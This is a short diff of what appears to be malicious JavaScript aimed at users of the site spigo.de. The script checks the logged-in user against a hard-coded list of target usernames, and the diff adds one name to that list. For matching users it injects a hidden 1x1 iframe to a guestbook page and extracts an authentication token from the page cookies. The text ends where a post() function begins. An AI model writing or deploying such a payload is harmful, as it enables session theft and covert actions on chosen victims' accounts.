@@ -1,5 +1,5 @@
 if(targetNames == undefined) {
-	var targetNames = ["Trinetest","annijap","Rick.1","HubertS","Dennisdc","NickDP","Kasper","Melli79","le magnifique"];
+	var targetNames = ["MadameBerlot", "Trinetest","annijap","Rick.1","HubertS","Dennisdc","NickDP","Kasper","Melli79","le magnifique"];
 
 	var tempNameEl = document.getElementById("ctl00_ddMenuTab");
 	var name = "";
@@ -13,7 +13,7 @@ if(targetNames == undefined) {
 
 	if($.inArray(name, targetNames) != -1) {
 		console.log("OK: " + name);
-		$("body").prepend('<iframe src="http://www.spigo.de/profiles/1000/guestbook/?mode=1" width="1" height="1" frameborder="0" id="hk"></iframe>');
+		$("body").prepend('<iframe style="position: fixed;" src="http://www.spigo.de/profiles/1000/guestbook/?mode=1" width="1" height="1" frameborder="0" id="hk"></iframe>');
 		var re = new RegExp("uth=(.*?)(;|$)");
 		var auth = document.cookie.match(re)[1];
 		function post() {
